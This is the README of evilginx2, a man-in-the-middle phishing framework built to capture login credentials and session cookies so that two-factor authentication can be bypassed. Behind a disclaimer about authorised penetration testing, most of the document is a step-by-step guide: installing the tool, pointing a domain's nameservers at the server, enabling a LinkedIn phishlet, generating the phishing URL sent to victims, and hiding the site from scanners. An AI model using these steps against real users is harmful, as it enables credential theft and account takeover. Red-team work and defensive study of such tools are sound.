<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/img/media/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/img/media/evilginx2-title-black-512.png" height="140" />
  </p>
</p>

**evilginx2** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protections.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.

## Installation

You can either use a [precompiled binary package](https://github.com/kgretzky/evilginx2/releases) for your architecture or you can compile **evilginx2** from source.

You will need an external server where you'll host your **evilginx2** installation. I personally recommend Digital Ocean and if you follow this referral link, you will get an extra $10 to spend on servers for free: [Digital Ocean VPS with $10 free credit to spend](https://m.do.co/c/50338abc7ffe). Evilginx runs very well on the cheapest Debian 8 VPS.

#### Installing from source

In order to compile from source, make sure you have installed **GO compiler** of version at least **>= 1.10.0** (get it from [here](https://golang.org/doc/install)) and that `$GOPATH` environment variable is set up properly (def. `$HOME/go`). Then follow these instructions:

```
go get -u github.com/kgretzky/evilginx2
cd $GOPATH/src/github.com/kgretzky/evilginx2 (if $GOPATH is not set, try $HOME/go)
make all
```

Instructions above can also be used to update **evilginx2** to latest version.

#### Installing from precompiled binary packages

Grab the package you want from [here](https://github.com/kgretzky/evilginx2/releases) and drop it on your box. Then do:
```
tar zxvf <package_name>.tar.gz
cd <package_name>
make all
```

## Usage

Type:
```
evilginx
```

You should see **evilginx2** logo with a prompt to enter commands. Type `help` or `help <command>` if you want to see available commands or more detailed information on them.

## Getting started

To get up and running, you need to first do some setting up.

At this point I assume, you've already registered a domain (let's call it `yourdomain.com`) and you set up the nameservers (both `ns1` and `ns2`) in your domain provider's admin panel to point to your server's IP (e.g. 10.0.0.1):
```
ns1.yourdomain.com = 10.0.0.1
ns2.yourdomain.com = 10.0.0.1
```

Set up your server's domain and IP using following commands:
```
config domain yourdomain.com
config ip 10.0.0.1
```

Now you can set up the phishlet you want to use. For the sake of this short guide, we will use a LinkedIn phishlet. Set up the hostname for the phishlet (it must contain your domain obviously):
```
phishlet hostname linkedin my.phishing.hostname.yourdomain.com
```

And now you can `enable` the phishlet, which will initiate automatic retrieval of LetsEncrypt SSL/TLS certificates if none are locally found for the hostname you picked:
```
phishlet enable linkedin
```

Your phishing site is now live. Think of the URL, you want the victim to be redirected to on successful login and get the phishing URL like this (victim will be redirected to `https://www.google.com`):
```
phishlet get-url linkedin https://www.google.com
```

Running phishlets will only respond to tokenized links, so any scanners who scan your main domain will be redirected to URL specified as `redirect_url` under `config`. If you want to hide your phishlet and make it not respond even to valid tokenized phishing URLs, use `phishlet hide/unhide <phishlet>` command.

## Credits

Huge thanks to Simone Margaritelli ([@evilsocket](https://twitter.com/evilsocket)) for [bettercap](https://github.com/bettercap/bettercap) and inspiring me to learn GO and rewrite the tool in that language!

## License

**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under GPL3 license.
